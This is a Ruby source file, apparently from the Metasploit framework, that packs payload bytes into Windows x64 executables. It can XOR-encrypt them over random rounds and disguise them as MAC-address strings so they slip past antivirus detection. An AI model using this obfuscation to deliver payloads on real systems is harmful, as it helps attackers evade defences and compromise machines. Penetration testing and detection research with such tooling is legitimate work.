require 'erb'
require 'metasploit/framework/compiler/mingw'
require 'metasploit/framework/compiler/windows'
require 'metasploit/framework/compiler/custom'

module Msf::Obfluscation::ExeTemplate

  def self.mac_obfluscate(payload)
    bytes = payload.bytes
    # Pad to a multiple of 4 bytes
    remainder = bytes.length % 6
    bytes += [255] * (6 - remainder) if remainder != 0

    #add buffer string because metasm likes to mess up end of array of strings for some reason
    bytes += [255]*6

    chunks = []
    i = 0
    bytes.each_slice(6) do |quad|
      chunks << quad.map { |b| format('%02X', b) }.join('-')
      i = i+1
    end
    chunks
  end
  
  def self.exe_template_obfuscate_compile(framework, code, opts)
    template_path = File.join(Msf::Config.data_directory, 'templates','template_x64_windows_xor_mac.erb')

    encryption_rounds = rand(2...10)
    xor_keys = encryption_rounds.times.map{ rand(256) }
    
    control_bytes = [rand(256)]

    for i in 0...encryption_rounds do
      control_bytes.append(control_bytes.last ^ xor_keys[i])
      code = code.bytes.map { |b| b ^ xor_keys[i] }.pack("C*")
    end

    code.prepend(control_bytes.last.chr)
    control_bytes = control_bytes.reverse
    control_bytes = control_bytes.drop(1)

    encrypted_payload_length = code.bytesize
    
    encrypted_payload = mac_obfluscate(code)
    encoded_payload_length = encrypted_payload.length
    encrypted_payload = encrypted_payload.map { |s| s + "\0" }.join.bytes.map { |b| "\\x%02X" % b }.join

    control_bytes = control_bytes.map { |b| "\\x%02x" % b }.join

    template = ERB.new(File.read(template_path))
    source_c = template.result(binding)
      
    Metasploit::Framework::Compiler::Custom.compile_random_c(source_c, :exe)
  end

  def self.exe_template_compile(framework, code, opts)
    template_path = File.join(Msf::Config.data_directory, 'templates','template_x64_windows.erb')

    payload = code.bytes.map { |b| "\\x%02x" % b }.join
    payload_length = payload.length
    
    template = ERB.new(File.read(template_path))
    source_c = template.result(binding)
      
    Metasploit::Framework::Compiler::Custom.compile_c(source_c, :exe)
  end
  

  def self.exe_template(framework, code, opts)
    return exe_template_obfuscate_compile(framework, code, opts) if opts[:dynamic_obfuscation]
    exe_template_compile(framework, code, opts)
  end


end
